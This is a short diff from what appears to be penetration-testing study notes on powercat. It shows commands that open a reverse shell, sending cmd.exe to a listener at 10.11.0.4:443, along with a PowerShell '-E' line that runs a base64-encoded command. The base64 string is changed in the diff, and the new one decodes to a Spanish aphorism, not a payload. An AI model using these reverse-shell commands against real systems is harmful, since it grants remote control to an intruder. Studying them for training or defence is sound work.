@@ -288,7 +288,7 @@ powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverse.ps1
 ```powershell
 #Victim's machine
 powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge> encodedreverse.ps1
-powershell.exe -E eHp6enp6enp6enp6enp6enp6enp6emFhYWFhYWFhYWFhYWFhYWFhYXdhc2FzY2RhZGN1aXNhZGlndXlzYWRpeWdjZGFzaXlhZ2Npc2FjZ2NzYWdhc2NpdWdhY2ljYWdjZ2ljYWdjZ2FzdWk...
+powershell.exe -E U2luIGNvbm9jaW1pZW50bywgbGEgaGFiaWxpZGFkIG5vIHNlIHB1ZWRlIGVuZm9jYXIuIFNpbiBoYWJpbGlkYWQsIGxhIGZ1ZXJ6YSBubyBwdWVkZSBzZXIgZWplcmNpZGEgeSBzaW4gZnVlcnphLCBlbCBjb25vY2ltaWVudG8gbm8gcHVlZGUgc2VyIGFwbGljYWRvLg==
 #This way we profit the PowerShell's ability to execute base64 encoded code. The -E flags allow us to execute encoded commands.
 ```
 
